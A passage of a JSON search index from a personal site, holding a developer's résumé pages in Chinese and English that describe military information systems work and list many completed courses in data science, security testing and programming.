| 出國管制系統 | 考核系統 | StorePreduce（大量數千行）、CronJob多隻 | 體能鑑測、CA憑證、人員查詢、門禁WebService | 財產抽籤系統 | . 自我學習與受訓課程（ＭＯＯＣ） . 對於新知識充滿熱情，強迫症般的利用下班時間不斷學習，加強自身不足，相信很快能適應或符合團隊需求。 . 類別 名稱 課程來源 講師 備考 . Data Science | Neural Networks and Deep Learning | Coursera | Deeplearning.ai Andrew Ng | 自行學習 | .   | Improving Deep Neural Networks | Coursera | Deeplearning.ai Andrew Ng | 自行學習 | .   | Structured Machine Learning Projects | Coursera | Deeplearning.ai Andrew Ng | 自行學習 | .   | Convolutional Neural Networks | Coursera | Deeplearning.ai Andrew Ng | 自行學習 | .   | Sequence Models | Coursera | Deeplearning.ai Andrew Ng | 自行學習 | .   | Machine Learning | Coursera | Standford Andrew Ng | 自行學習 | .   | Artificial Intelligence A-Z™: Learn How To Build An AI | Udemy | Hadelin de Ponteves | 自行學習 | .   | Deep Learning A-Z™: Hands-On Artificial Neural Networks | Udemy | Kirill Eremenko | 自行學習 | .   | Apache Hadoop之開發者訓練課程 | 恆毅資訊 | 潘家羲 Sparrow Pan | 公司派訓 | .   | 机器学习 A-Z (Machine Learning A-Z in Chinese) | Udemy | Hadelin de Ponteves | 自行學習 | .   | Data Science and Machine Learning for Infosec | Pentester Academy | Sinan Ozdemir | 自行學習 | .   | D3.js資料視覺化 | 國發會 | 巨匠電腦講師 | 公司派訓 | .   | Building Recommender Systems with Machine Learning and AI |   | Sundog Education by Frank Kane | 自行學習 | .   | Machine Learning with Javascript |   | Stephen Grider, Engineering Architect | 自行學習 | .   | Artificial Intelligence 2018: Build the Most Powerful AI |   | Hadelin de Ponteves, AI Entrepreneur | 自行學習 | .   | Machine Learning Practical: 6 Real-World Applications |   | Kirill Eremenko, Data Scientist | 自行學習 | .   | Deep Learning and Computer Vision A-Z™: OpenCV, SSD &amp; GANs |   | Hadelin de Ponteves, AI Entrepreneur | 自行學習 | .   | Tableau 10 A-Z: Hands-On Tableau Training For Data Science |   | Kirill Eremenko, Data Scientist | 自行學習 | . Security | Python for Pentesters | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | x86 Assembly Language and Shellcoding on Linux | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Javascript for Pentesters | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Pentesting with Metasploit | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Wi-Fi Security and Pentesting | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Exploiting Simple Buffer Overflows on Win32 | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | GNU Debugger Megaprimer | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Web Application Pentesting | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Network Pentesting | Pentester Academy | Vivek Ramachandran | 自行學習 | .   | Reverse Engineering and Exploit Development | Udemy | Infinite Skills Dr.Philip Polstra | 自行學習 | .   | Kali Linux:Learn The Complete Hacking Operating System | Udemy | Sunil K. Gupta | 自行學習 | .   | Advanced Ethical Hacking | Udemy | VTCSoftware Training | 自行學習 | .   | The Complete Cyber Security Course : Hackers Exposed | Udemy | Nathan House | 自行學習 | .   | The Complete Nmap Ethical Hacking Course : Network Security | Udemy | Nathan House | 自行學習 | .   | The Complete Cyber Security Course : Network Security | Udemy | Nathan House | 自行學習 | .   | The Complete Cyber Security Course : End Point Protection | Udemy | Nathan House | 自行學習 | .   | Learn Social Engineering From Scratch | Udemy | Zaid Sabih | 自行學習 | .   | Website Hacking in Practice | Udemy | Hacking School | 自行學習 | .   | The Complete Cyber Security Course : Anonymous Browsing | Udemy | Nathan House | 自行學習 | .   | SSCP資安專業人員認證課程 | 恆毅資訊 | 唐任威 Vincent_tang | 公司派訓 | . 程式開發 | JavaScript 全攻略：克服 JS 的奇怪部分 | Udemy | 慕課 | 自行學習 | .   | JavaScript Design Patterns: 20 Patterns for Expert Code | Udemy | Packt Publishing | 自行學習 | .   | A Simple Node.js Mongo Restify API in Less Than 3 Hours | Udemy | Jim Hlad | 自行學習 | .   | Learning Windows PowerShell | Udemy | Infinite Skills | 自行學習 | .   | C# Developers: Learn the Art of Writing Clean Code | Udemy | Mosh Hamedani | 自行學習 | .   | Red Hat程式設計 | 恆毅資訊 | 王俊城Anderson Wang | 公司派訓 | .   | Andriod程式設計 | 恆毅資訊 | 何孟翰 Mark Ho | 公司派訓 | .   | Linux系統管理 | 國發會 | 林國龍 Bill Lin | 公司派訓 | .   | Vue.js Essentials - 3 Course Bundle |   | Anthony Gore, Vue Community Partner | 自行學習 | .   | 動畫互動網頁特效入門（JS/CANVAS |   | hahow 吳哲宇 | 自行學習 | . 其他 | Number Theory | Udemy | Miran Fattah | 自行學習 | .   | 微積分-導函數篇、極限篇、基礎數學篇 | Udemy | Lee Bor-Jian | 自行學習 | .   | Python for Data Structures, Algorithms, and Interviews | Udemy | Jose Portilla | 自行學習 | .   | BlockchainBasics:Practical Approach | Udemy | Toshendra Sharma | 自行學習 | .   | 算法基礎 | Coursera | Peking Universary | 自行學習 | .   | 數據結構基礎 | Coursera | Peking Universary | 自行學習 | .   | 工程數學-線性代數 | 台大開放式課程 | 蘇柏青 | 自行學習 | .   | JavaScript Algorithms and Data Structures Masterclass |   | Colt Steele | 自行學習 | .   | Elasticsearch 6 and Elastic Stack - In Depth and Hands On |   | Sundog Education by Frank Kane | 自行學習 | .   | Blockchain A-Z™: Learn How To Build Your First Blockchain |   | Hadelin de Ponteves, AI Entrepreneur | 自行學習 | .   | 用 Python 理財：打造小資族選股策略 |   | hahow FinLab | 自行學習 | .",
    "url": "http://localhost:4000/_notes/docs/work/work_Chinese.html",
    "relUrl": "/docs/work/work_Chinese.html"
  },
  "36": {
    "title": "work_Eng",
    "content": "Brief About Me. . 1.Certificate Authorize . In order to integrate the military smart card verification mechanism, the verification program is designed for the national military customized smart card. After the user inserts the smart card into the card reader, the certificate verification program is used to enter the PinCode and then do the first stage verification. When the PinCode is verified, After completion, enter the card to read the signature information and verify, then the verification send to the LDAP to retrieve the identity, and send the serial number to the MCA for validation and check. . 2.Reserving and Pentesting . For the Reserving and ShellCode, as shown in Figure 2-1, familiarize low-level computer language, and then use the encoding method to test the anti-virus detection and ShellCode evasion ability. . 3.Human Resource Report System . Developed with the Human Resource department, using WPF, MVC and Http Restful architecture, combined with JustOneTimeToken validation. The development project includes more than 60 reports, and the development time is about 1 year. It is a core system now. In statistic’s case, all the units are displayed in a tree view, and the function of finding the sub-units and the total amount of the units after the user check. The recursive method is used at the initial stage of development and there is a performance bottleneck, a large number of repeated operations occur in the recursive process. At last, we use the dynamic plan to reduce the amount of calculation and the problem is solved successfully. . 4.IT Fcilities Resource Visualization . Cooperate with another divion to count re-install the computer’s operating system, so that it can grasp the current system installation status, and combine the assets, network management and reporting system database synchronization and scheduling feedback, and use the chart to visually display relevant information. . 5.Military Rescue System . For military’s rescue mission, the “Disaster Prevention Information System” was developed in 2016, integrating the TGOS disaster relief layer information of the Ministry of the Interior. This project intergate with GoogleMapAPI, SignalR, and need to develpoe the Android application. . 6.Reserve Soldier Registration System . The Reserve Soldier Registration System is developed in 2018,it save a lot of time for the reserve soldier register when they retire. . 7.Redemption of Ｗorking Years System . In 2018, I develop this system integrate with the Civil Service Retirement Pension Foundation to Calculate over 80,000 people’s payment for redemption. The entire development and testing time was severely compressed. it only 2 week for developing and one week for testing. Finally, it ended successfully and got good reaction. . 8.Another Project . Because of Military secret deal, only list the systems. . :closed_book: Developing . Military Insurance Calculation and Querying System | Volunteer soldiers starting system | Unit portal with background | Code query system | SyBase topology query system | National Army Software Management Information System | Portal imitation WebDesktop | Retirement data exchange web service | Verification code generates WebService | Questionnaire system | . :closed_book: Maintain . Personnel Information System (7 subsystems) | Personnel inquiry system (5 subsystems) | Personnel transmission system | Going abroad control system | Assessment system | StorePreduce (a large number of thousands of lines), CronJob multiple | Physical assessment, CA certificate, personnel query, access control WebService | Property Lottery System | . Self learning and mooc . Enthusiastic about knowledge,continuously learning after working time. . Category CalssName Course source lecturer Memo . Data Science | Neural Networks and Deep Learning | Coursera | Deeplearning.ai Andrew Ng | self-Learn | .   | Improving Deep Neural Networks | Coursera | Deeplearning.ai Andrew Ng | self-Learn | .   | Structured Machine Learning Projects | Coursera | Deeplearning.ai Andrew Ng | self-Learn | .   | Convolutional Neural Networks | Coursera | Deeplearning.ai Andrew Ng | self-Learn | .   | Sequence Models | Coursera | Deeplearning.ai Andrew Ng | self-Learn | .   | Machine Learning | Coursera | Standford Andrew Ng | self-Learn | .   | Artificial Intelligence A-Z™: Learn How To Build An AI | Udemy | Hadelin de Ponteves | self-Learn | .   | Deep Learning A-Z™: Hands-On Artificial Neural Networks | Udemy | Kirill Eremenko | self-Learn | .   | Apache Hadoop of Development training | 恆毅資訊 | 潘家羲 Sparrow Pan | company-training | .   | MachineLearning A-Z (Machine Learning A-Z in Chinese) | Udemy | Hadelin de Ponteves | self-Learn | .   | Data Science and Machine Learning for Infosec | Pentester Academy | Sinan Ozdemir | self-Learn | .   | D3.js Visualiztion | 國發會 | 巨匠電腦講師 | company-training | .   | Building Recommender Systems with Machine Learning and AI |   | Sundog Education by Frank Kane | self-Learn | .   | Machine Learning with Javascript |   | Stephen Grider, Engineering Architect | self-Learn | .   | Artificial Intelligence 2018: Build the Most Powerful AI |   | Hadelin de Ponteves, AI Entrepreneur | self-Learn | .   | Machine Learning Practical: 6 Real-World Applications |   | Kirill Eremenko, Data Scientist | self-Learn | .   | Deep Learning and Computer Vision A-Z™: OpenCV, SSD &amp; GANs |   | Hadelin de Ponteves, AI Entrepreneur | self-Learn | .   | Tableau 10 A-Z: Hands-On Tableau Training For Data Science |   | Kirill Eremenko, Data Scientist | self-Learn | . Security | Python for Pentesters | Pentester Academy | Vivek Ramachandran | self-Learn | .   | x86 Assembly Language and Shellcoding on Linux | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Javascript for Pentesters | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Pentesting with Metasploit | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Wi-Fi Security and Pentesting | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Exploiting Simple Buffer Overflows on Win32 | Pentester Academy | Vivek Ramachandran | self-Learn | .   | GNU Debugger Megaprimer | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Web Application Pentesting | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Network Pentesting | Pentester Academy | Vivek Ramachandran | self-Learn | .   | Reverse Engineering and Exploit Development | Udemy | Infinite Skills Dr.Philip Polstra | self-Learn | .   | Kali Linux:Learn The Complete Hacking Operating System | Udemy | Sunil K. Gupta | self-Learn | .   | Advanced Ethical Hacking | Udemy | VTCSoftware Training | self-Learn | .   | The Complete Cyber Security Course : Hackers Exposed | Udemy | Nathan House | self-Learn | .   | The Complete Nmap Ethical Hacking Course : Network Security | Udemy | Nathan House | self-Learn | .   | The Complete Cyber Security Course : Network Security | Udemy | Nathan House | self-Learn | .   | The Complete Cyber Security Course : End Point Protection | Udemy | Nathan House | self-Learn | .   | Learn Social Engineering From Scratch | Udemy | Zaid Sabih | self-Learn | .   | Website Hacking in Practice | Udemy | Hacking School | self-Learn | .   | The Complete Cyber Security Course : Anonymous Browsing | Udemy | Nathan House | self-Learn | .   | SSCP Certificate Class | 恆毅資訊 | 唐任威 Vincent_tang | company-training | . Programing Training | JavaScript the most weird part | Udemy |   | self-Learn | .   | JavaScript Design Patterns: 20 Patterns for Expert Code | Udemy | Packt Publishing | self-Learn | .   | A Simple Node.js Mongo Restify API in Less Than 3 Hours | Udemy | Jim Hlad | self-Learn | .   | Learning Windows PowerShell | Udemy | Infinite Skills | self-Learn | .   | C# Developers: Learn the Art of Writing Clean Code | Udemy | Mosh Hamedani | self-Learn | .   | Red Hat Program | 恆毅資訊 | 王俊城Anderson Wang | company-training | .   | Andriod Camp | 恆毅資訊 | 何孟翰 Mark Ho | company-training | .   | Linux System Management | 國發會 | 林國龍 Bill Lin | company-training | .   | Vue.js Essentials - 3 Course Bundle |   | Anthony Gore, Vue Community Partner | self-Learn | .   | JS CANVAS |   | hahow 吳哲宇 | self-Learn | . Another | Number Theory | Udemy | Miran Fattah | self-Learn | .   | Calculus-Conductance, Limit, Basic Mathematics | Udemy | Lee Bor-Jian | self-Learn | .   | Python for Data Structures, Algorithms, and Interviews | Udemy | Jose Portilla | self-Learn | .   | BlockchainBasics:Practical Approach | Udemy | Toshendra Sharma | self-Learn | .   | Algorithm | Coursera | Peking Universary | self-Learn | .   | Data Structure Foundation | Coursera | Peking Universary | self-Learn | .   | Engineering Mathematics-Linear Algebra | Taiwan University Opening Class | 蘇柏青 | self-Learn | .   | JavaScript Algorithms and Data Structures Masterclass |   | Colt Steele | self-Learn | .   | Elasticsearch 6 and Elastic Stack - In Depth and Hands On |   | Sundog Education by Frank Kane | self-Learn | .   | Blockchain A-Z™: Learn How To Build Your First Blockchain |   | Hadelin de Ponteves, AI Entrepreneur | self-Learn | .   | FinTech use Python |   | hahow FinLab | self-Learn | .",
    "url": "http://localhost:4000/_notes/docs/work/work_Eng.html",
    "relUrl": "/docs/work/work_Eng.html"
  }
  
}
